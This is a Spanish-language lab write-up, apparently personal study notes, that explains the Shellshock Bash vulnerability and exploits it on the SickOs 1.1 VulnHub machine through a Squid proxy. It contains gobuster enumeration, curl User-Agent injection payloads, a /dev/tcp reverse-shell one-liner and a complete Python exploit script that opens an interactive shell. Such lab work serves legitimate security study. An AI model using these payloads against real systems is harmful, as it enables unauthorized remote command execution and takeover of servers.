-------
- Tags:
----
# Definición

> Un ataque **Shellshock** es un tipo de ataque informático que aprovecha una vulnerabilidad en el **intérprete de comandos Bash** en sistemas operativos basados en Unix y Linux. Esta vulnerabilidad se descubrió en 2014 y se considera uno de los ataques más grandes y generalizados en la historia de la informática.

Esta vulnerabilidad en Bash permite a los atacantes ejecutar comandos maliciosos en el sistema afectado, lo que les permite tomar el control del sistema y acceder a información confidencial, modificar archivos, instalar programas maliciosos, etc.

La vulnerabilidad Shellshock se produce en el intérprete de comandos Bash, que es utilizado por muchos sistemas operativos Unix y Linux para ejecutar scripts de shell. El problema radica en la forma en que Bash maneja las variables de entorno. Los atacantes pueden inyectar código malicioso en estas variables de entorno, las cuales Bash ejecuta sin cuestionar su origen o contenido.

Los atacantes pueden explotar esta vulnerabilidad a través de diferentes vectores de ataque. Uno de ellos es a través del **User-Agent**, que es la información que el navegador web envía al servidor web para identificar el tipo de navegador y sistema operativo que se está utilizando. Los atacantes pueden manipular el User-Agent para incluir comandos maliciosos, que el servidor web ejecutará al recibir la solicitud.

# Explotación de ShellShock en máquina de Vulnhub

Para explotar esta vulnerabilidad utilizaremos la máquina que detectamos que posee un **Squid Proxy** del capitulo [[Squid Proxies]]. Esta máquina se puede descargar a través de la siguiente [web](https://www.vulnhub.com/entry/sickos-11,132/).

Una vez estemos pasando nuestras peticiónes por el **FoxyProxy**, a través del **Squid Proxy** que detectamos en el *puerto 3128*, haremos lo siguiente.

Como hicimos en el caso anterior, utilizaremos ``gobuster`` nuevamente para detectar los directorios existentes dentro de la web http://192.168.0.102, pero esta vez añadiremos el parámetro ``--add-slash`` para que nos añada una ``/``al final de cada ruta, de esta forma quizás encontremos mas directorios ocultos.

- ``gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy http://192.168.0.102:3128 -u 192.168.0.102:80 --add-slash -t 10``

![[SHSH 1.png]]

La ruta que nos interesa en este caso es la de *http://192.168.0.102/cgi-bin/*. ==Siempre que encontremos esta ruta es bueno intentar testear este tipo de ataque==.

En estos casos al encontrar esta ruta siempre es útil intentar buscar archivos en **gobuster** con el parámetro ``-x (extensión)`` que contengan extensiones como *pl*, *sh*, y *cgi*, eso es lo que haremos pero contemplando la ruta */cgi-bin/*.

- ``gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy http://192.168.0.102:3128 -u http://192.168.0.102/cgi-bin --add-slash -t 10 -x pl, sh, cgi``

![[SHSH 2.png]]

Si nos dirigimos a ese directorio por nuestro navegador http://192.168.0.102/cgi-bin/status veremos un panel, en este habrá una cadena que dirá "*uptime*" donde se mostrará en tiempo real **la hora**, si reiniciamos la página con ``F5``, veremos que en el apartado de **segundos**, se **actualizará** cada vez que reiniciamos la web. Esto también se puede hacer con ``curl``, a continuación mostramos los dos casos.

![[SHSH 3.png]]

- ``curl -s http://192.168.0.102/cgi-bin/status --proxy http://192.168.0.102:3128 | jq``

![[SHSH 4.png]]

--------

A continuación nos apoyaremos de una [web](https://blog.cloudflare.com/inside-shellshock/) que explica detalladamente como los atacantes utilizan el ataque de ShellShock mediante la **manipulación** del **User-Agent** con ``curl``.

- ``curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/``

Todo el potencial de este comando radica en los caracteres ``() { :; };``. En el caso del comando anterior, vemos que se emplea un ``/bin/eject``, este comando lo que hace es abrir la **disquetera de la PC**, pero en su lugar **podríamos colocar el comando que quisieramos** como por ejemplo una **whoami** pero especificando su ruta absoluta ==Podemos tomar referencias desde nuestra terminal con el comando ``which whoami``==.

- ``curl -s http://192.168.0.102/cgi-bin/status --proxy http://192.168.0.102:3128 -H "User-Agent: () { :; }; /usr/bin/whoami" ``

![[SHSH 5.png]]

Aplicando los ``echo;`` quedaría así.

![[SHSH 6.png]]

Por lo tanto podríamos enviarnos una **Reverse Shell** pero teniendo en cuenta que a la hora de efectuar un **ShellShock** debemos especificar la **ruta absoluta** del comando **Bash**, que puede ser tanto ``/bin/bash`` como ``/usr/bin/bash``, por lo tanto es cuestión de probar cual funciona.

- ``/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.194/1234 0>&1'``

![[SHSH 7.png]]

-------

Por último lo que podríamos hacer es crear un script en Python3

```python
#!/usr/bin/python3

import sys, signal, requests, threading
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = 'http://192.168.0.102/cgi-bin/status'
squid_proxy = {'http': 'http://192.168.0.102:3128'}
lport = 1234

def shellshock_attack():

    headers = {'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.194/1234 0>&1'"}

    r = requests.get(main_url, headers=headers, proxies=squid_proxy)

if __name__ == '__main__':

    try:
        threading.Thread(target=shellshock_attack).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    if shell.sock is None:
        log.failure("No se pudo establecer la conexión")
        sys.exit(1)
    else:
        shell.interactive()

```